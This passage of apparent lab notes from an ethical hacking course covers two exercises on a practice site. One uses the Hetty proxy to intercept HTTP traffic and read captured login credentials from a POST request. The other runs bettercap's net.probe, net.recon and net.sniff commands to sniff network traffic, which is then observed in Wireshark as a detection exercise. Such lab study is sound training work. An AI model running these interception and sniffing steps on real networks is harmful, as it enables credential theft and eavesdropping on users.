* Intercept HTTP Traffic using Hetty :~
  - open windows 11 and open the hetty.exe 
  - it will running on the cmd and open the firefox and type 
    - http://localhost:8080
  - hetty will open in browser
  - click the MANAGE PROJECTS button
  - type Project name as Moviescope and click + CREATE & OPEN PROJECT button
  - You can observe that a new project name Moviescope has been created under Manage projects section with a status as Active
  - Click Proxy logs icon ( 2022-04-13_15-20-45.png)) from the left-pane
  - open windows server 2022
  - Open Google Chrome web browser, click the Customize and control Google Chrome icon, and select Settings
  - enable the proxy and port
  - the web browser go to http://www.moviescope.com
  - go back to the windows 11
  - You can observe that the logs are captured in the Proxy logs page. Here, we are focusing on logs associated with moviescope.com website
  - go back to the 2022 mechine and login to moviescope website using its credentials
  - come back to the windows 11 and open hetty and find the POST request and Select the POST request and in the lower section of the page, select Body tab under POST section
  - Under the Body tab, you can observe the captured user credentials
  - go back to the 2022 machine and turn off the proxy settings  
</details>

<details>
<summary>Detect Session Hijacking</summary>

* Detect Session Hijacking :~
  - open the windows 11 machine and open the wireshark with ethernet interface
  - we shall launch a session hijacking attack on the target machine (Windows 11) using bettercap
  - open the kai linux and sudo su and cd and type:
    - bettercap -iface eth0
    - -iface: specifies the interface to bind to (here, eth0)
  - Type net.probe on and press Enter
  - Type net.recon on and press Enter (The net.recon module displays the detected active IP addresses in the network. In real-time, this module will start sniffing network packets)
  - Type net.sniff on and press Enter
  - You can observe that bettercap starts sniffing network traffic on different machines in the network
  - witch back to the Windows 11 machine and observe the huge number of ARP packets captured by the Wireshark  
</details>